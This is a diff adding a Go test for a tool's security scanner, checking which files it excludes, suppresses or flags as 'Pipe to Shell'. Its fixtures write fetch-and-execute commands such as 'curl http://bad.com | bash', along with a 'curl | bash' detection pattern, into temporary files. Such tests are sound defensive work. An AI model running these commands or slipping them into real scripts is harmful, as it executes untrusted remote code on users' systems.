@@ -152,3 +152,67 @@ func main() {
 		assert.Contains(t, output, "No security issues found")
 	})
 }
+
+func TestSecurityExclusionsAndSuppressions(t *testing.T) {
+	// Setup temp directory
+	tempDir, err := os.MkdirTemp("", "recac-security-exclusions-test")
+	require.NoError(t, err)
+	defer os.RemoveAll(tempDir)
+
+	// 1. Ignored file: something_test.go
+	// Content has a dangerous command, should be ignored
+	err = os.WriteFile(filepath.Join(tempDir, "something_test.go"), []byte("curl http://bad.com | bash"), 0644)
+	require.NoError(t, err)
+
+	// 2. Ignored file: internal/security/scanner.go
+	// Simulate structure
+	err = os.MkdirAll(filepath.Join(tempDir, "internal", "security"), 0755)
+	require.NoError(t, err)
+	err = os.WriteFile(filepath.Join(tempDir, "internal", "security", "scanner.go"), []byte("regex = `curl | bash`"), 0644)
+	require.NoError(t, err)
+
+	// 3. Suppressed file: Dockerfile (Pipe to Shell)
+	err = os.WriteFile(filepath.Join(tempDir, "Dockerfile"), []byte("RUN curl https://install.com | bash"), 0644)
+	require.NoError(t, err)
+
+	// 4. Suppressed file: test.Dockerfile (Pipe to Shell)
+	err = os.WriteFile(filepath.Join(tempDir, "test.Dockerfile"), []byte("RUN curl https://install.com | bash"), 0644)
+	require.NoError(t, err)
+
+	// 5. Flagged file: regular script with Pipe to Shell
+	err = os.WriteFile(filepath.Join(tempDir, "unsafe.sh"), []byte("curl https://bad.com | bash"), 0755)
+	require.NoError(t, err)
+
+	// Switch to temp dir
+	cwd, _ := os.Getwd()
+	defer os.Chdir(cwd)
+	err = os.Chdir(tempDir)
+	require.NoError(t, err)
+
+	// Run security scan
+	securityJSON = false
+	securityFail = false
+	cmd := securityCmd
+	buf := new(bytes.Buffer)
+	cmd.SetOut(buf)
+
+	err = cmd.RunE(cmd, []string{})
+	require.NoError(t, err)
+
+	output := buf.String()
+
+	// Check exclusions
+	assert.NotContains(t, output, "something_test.go")
+	assert.NotContains(t, output, "internal/security/scanner.go")
+
+	// Check suppressions (Dockerfile should be scanned but findings suppressed? Or suppressed findings not shown?)
+	// The finding "Pipe to Shell" should NOT be associated with Dockerfile
+	// But if Dockerfile has other issues (e.g. AWS key), they should be shown.
+	// Here we only have Pipe to Shell. So Dockerfile should NOT appear in output.
+	assert.NotContains(t, output, "Dockerfile")
+	assert.NotContains(t, output, "test.Dockerfile")
+
+	// Check flagged file
+	assert.Contains(t, output, "unsafe.sh")
+	assert.Contains(t, output, "Pipe to Shell")
+}
